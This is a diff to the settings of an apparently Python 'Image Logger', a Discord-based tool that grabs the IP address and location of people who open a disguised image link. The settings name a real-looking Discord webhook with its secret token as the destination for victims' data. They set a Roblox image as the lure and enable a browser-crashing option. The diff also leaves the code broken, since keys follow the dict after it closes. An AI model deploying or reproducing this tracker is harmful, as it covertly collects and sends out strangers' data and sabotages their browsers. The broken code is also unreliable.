@@ -9,25 +9,22 @@ __author__ = "Dexty"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z",
-    "image": "https://tr.rbxcdn.com/180DAY-f8add11aa463c6b6827252d5087c1dfc/768/432/Image/Webp/noFilter",
-    "imageArgument": True, # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
+    
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger", 
+    "color": 0x00FFFF, 
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "crashBrowser": True,
+    "accurateLocation": False,
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": {
+        "doMessage": False,
+        "message": "Here is your link: https://tr.rbxcdn.com/180DAY-f8add11aa463c6b6827252d5087c1dfc/768/432/Image/Webp/noFilter",
+        "richMessage": True,
     },
+}
+
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
